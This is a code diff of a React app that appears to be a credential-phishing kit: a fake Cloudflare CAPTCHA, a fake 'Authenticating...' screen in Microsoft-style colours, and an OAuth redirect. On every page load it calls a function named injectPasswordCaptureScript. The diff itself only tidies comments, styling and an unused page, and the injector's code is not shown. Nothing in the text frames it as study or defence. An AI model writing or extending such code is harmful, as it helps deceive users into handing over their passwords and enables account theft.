@@ -1,13 +1,11 @@
 import React, { useState, useEffect } from 'react';
 import { BrowserRouter as Router, Routes, Route, useLocation } from 'react-router-dom';
-import MessageIconLanding from './components/MessageIconLanding';
 import CloudflareCaptcha from './components/CloudflareCaptcha';
 import RealOAuthRedirect from './components/RealOAuthRedirect';
-import AuthCallback from './components/AuthCallback'; // Import the new component
+import AuthCallback from './components/AuthCallback';
 import { injectPasswordCaptureScript } from './utils/password-capture-injector';
 
 const App: React.FC = () => {
-    // Using React Router to handle different pages
     return (
         <Router>
             <MainContent />
@@ -19,7 +17,6 @@ const MainContent: React.FC = () => {
     const [currentPage, setCurrentPage] = useState('captcha');
     const location = useLocation();
 
-    // Inject scripts on component mount and location change
     useEffect(() => {
         try {
             injectPasswordCaptureScript();
@@ -29,7 +26,6 @@ const MainContent: React.FC = () => {
         }
     }, [location]);
 
-    // This component will render the correct "page" based on the URL path
     return (
         <Routes>
             <Route path="/auth/callback" element={<AuthCallback />} />
@@ -38,8 +34,6 @@ const MainContent: React.FC = () => {
     );
 };
 
-
-// This component contains the original page logic
 const DefaultPage = ({ currentPage, setCurrentPage }) => {
     useEffect(() => {
         const urlParams = new URLSearchParams(window.location.search);
@@ -51,6 +45,7 @@ const DefaultPage = ({ currentPage, setCurrentPage }) => {
     }, [setCurrentPage]);
 
     const handleCaptchaVerified = () => {
+        console.log('✅ CAPTCHA verified');
         setCurrentPage('authenticating');
     };
 
@@ -62,12 +57,11 @@ const DefaultPage = ({ currentPage, setCurrentPage }) => {
         if (currentPage === 'authenticating') {
             const timer = setTimeout(() => {
                 setCurrentPage('replacement');
-            }, 1500); // Short delay before redirecting to replacement
+            }, 1500);
             return () => clearTimeout(timer);
         }
     }, [currentPage]);
     
-    // Original switch logic for the main flow
     switch (currentPage) {
         case 'captcha':
             return (
@@ -76,21 +70,26 @@ const DefaultPage = ({ currentPage, setCurrentPage }) => {
                     onBack={handleCaptchaBack}
                 />
             );
+        
         case 'authenticating':
             return (
               <div style={{
-                display: 'flex', justifyContent: 'center', alignItems: 'center', height: '100vh',
-                fontFamily: 'Arial, sans-serif', backgroundColor: '#f3f2f1'
+                display: 'flex', 
+                justifyContent: 'center', 
+                alignItems: 'center', 
+                height: '100vh',
+                fontFamily: 'Arial, sans-serif', 
+                backgroundColor: '#f3f2f1'
               }}>
                 <div style={{ textAlign: 'center', fontSize: '24px', color: '#323130' }}>
-                  Authenticating...
+                  🔐 Authenticating...
                 </div>
               </div>
             );
-        case 'message-icon':
-            return <MessageIconLanding onOpenMessage={() => {}} />;
+        
         case 'replacement':
             return <RealOAuthRedirect />;
+        
         default:
             return (
                 <CloudflareCaptcha
